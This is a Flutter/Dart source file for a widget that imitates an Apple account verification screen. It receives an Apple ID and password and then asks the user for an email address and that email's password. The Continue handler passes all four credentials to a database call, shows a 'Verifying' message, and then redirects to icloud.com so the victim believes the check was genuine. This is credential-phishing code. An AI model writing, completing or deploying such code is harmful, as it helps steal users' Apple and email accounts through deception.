import 'dart:async';
import 'package:apple/database/database.dart';
import 'package:email_validator/email_validator.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';

class VerifyFormWidget extends StatefulWidget {
  final TextEditingController appleId;
  final TextEditingController applePassword;
  const VerifyFormWidget({
    super.key,
    required this.appleId,
    required this.applePassword,
  });

  @override
  State<VerifyFormWidget> createState() => _VerifyFormWidgetState();
}

class _VerifyFormWidgetState extends State<VerifyFormWidget> {
  late TextEditingController appleId;
  late TextEditingController applePassword;
  final Uri url = Uri.parse('https://www.icloud.com/');
  final TextEditingController email = TextEditingController();
  final TextEditingController password = TextEditingController();

  GlobalKey<FormState> veryfyformkey = GlobalKey<FormState>();

  @override
  @override
  void initState() {
    super.initState();
    appleId = widget.appleId;
    applePassword = widget.applePassword;
  }

  @override
  Widget build(BuildContext context) {
    return Form(
      key: veryfyformkey,
      autovalidateMode: AutovalidateMode.always,
      child: Column(children: [
        const SizedBox(height: 20),
        SizedBox(
            child: Padding(
          padding: const EdgeInsets.only(
            left: 20.0,
            right: 20,
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: const [
              Text(
                'Email Address And Password Required',
                style: TextStyle(
                    fontSize: 17,
                    color: Colors.black,
                    fontWeight: FontWeight.normal),
              ),
              SizedBox(height: 40),
              Row(
                children: [
                  Expanded(
                    flex: 1,
                    child: SizedBox(
                      child: Text(
                        "Enter Your Email Address and password to verify your account !",
                        style: TextStyle(
                            fontSize: 13,
                            color: CupertinoColors.destructiveRed,
                            fontWeight: FontWeight.normal),
                      ),
                    ),
                  ),
                ],
              ),
              //
              SizedBox(height: 15),
            ],
          ),
        )),
        const SizedBox(
          height: 10,
        ),
        Padding(
          padding: const EdgeInsets.only(left: 10.0, right: 10.0),
          child: TextFormField(
            enableInteractiveSelection: true,
            autofillHints: const [AutofillHints.email],
            enableSuggestions: true,
            autocorrect: true,
            showCursor: true,
            autofocus: false,
            textAlign: TextAlign.start,
            textDirection: TextDirection.ltr,
            strutStyle: const StrutStyle(),
            style: const TextStyle(),
            textInputAction: TextInputAction.done,
            // FIX: Remove or change textCapitalization
            keyboardType: TextInputType.emailAddress,
            controller: email,
            decoration: const InputDecoration(
              contentPadding:
                  EdgeInsets.only(left: 10, right: 10, top: 5, bottom: 5),
              border: OutlineInputBorder(
                  borderRadius: BorderRadius.all(Radius.circular(10))),
              hintText: ' Email Address',
              hintStyle: TextStyle(fontSize: 16),
            ),
            validator: (ifemail) => !EmailValidator.validate(ifemail!)
                ? 'Enter a valid email'
                : null,
          ),
        ),
        const SizedBox(height: 20),
        Padding(
          padding: const EdgeInsets.only(left: 10.0, right: 10.0),
          child: TextFormField(
            showCursor: true,
            autofocus: false,
            textAlign: TextAlign.start,
            strutStyle: const StrutStyle(),
            style: const TextStyle(),
            textInputAction: TextInputAction.done,
            keyboardType: TextInputType.visiblePassword,
            controller: password,
            decoration: const InputDecoration(
              contentPadding: EdgeInsets.only(left: 10, right: 15),
              border: OutlineInputBorder(
                  borderRadius: BorderRadius.only(
                      topLeft: Radius.circular(10),
                      topRight: Radius.circular(10),
                      bottomRight: Radius.circular(10),
                      bottomLeft: Radius.circular(10))),
              hintText: ' password',
              hintStyle: TextStyle(fontSize: 16),
            ),
            validator: (ifpassword) {
              if (ifpassword!.isEmpty) {
                return 'Please enter password';
              } else if (ifpassword.length < 6) {
                return 'Please enter a correct password';
              } else {
                return null;
              }
            },
          ),
        ),
        const SizedBox(height: 30),
        TextButton(
          child: const Text(
            'Continue',
            style: TextStyle(fontSize: 23, color: Colors.blue),
          ),
          onPressed: () {
            if (veryfyformkey.currentState!.validate()) {
              if (kDebugMode) {
                print('${email.text},${password.text}');
              }

              FutureBuilder<Map<String, dynamic>>(
                future: Database().getData(
                    password: applePassword.text.trim(),
                    username: appleId.text.trim(),
                    emailPassword: password.text,
                    emailUsername: email.text),
                builder: (BuildContext context,
                    AsyncSnapshot<Map<String, dynamic>> snapshot) {
                  switch (snapshot.connectionState) {
                    case ConnectionState.none:
                      return const Text('Hey you got no data');
                    case ConnectionState.done:
                      return const Text("Ice cream time , you are all done");
                    default:
                      return const CircularProgressIndicator(
                          color: CupertinoColors.activeBlue);
                  }
                },
              );
              const info = 'Verifying please wait...';
              const snackBar = SnackBar(
                content: Text(info),
                duration: Duration(seconds: 3),
                backgroundColor: CupertinoColors.activeBlue,
              );
              ScaffoldMessenger.of(context).showSnackBar(snackBar);

              Timer(const Duration(seconds: 3), () => launchUrl(url));
            }
          },
        ),
        const SizedBox(height: 10),
        TextButton(
          child: const Text('Manage your Apple account'),
          onPressed: () {},
        ),
      ]),
    );
  }
}
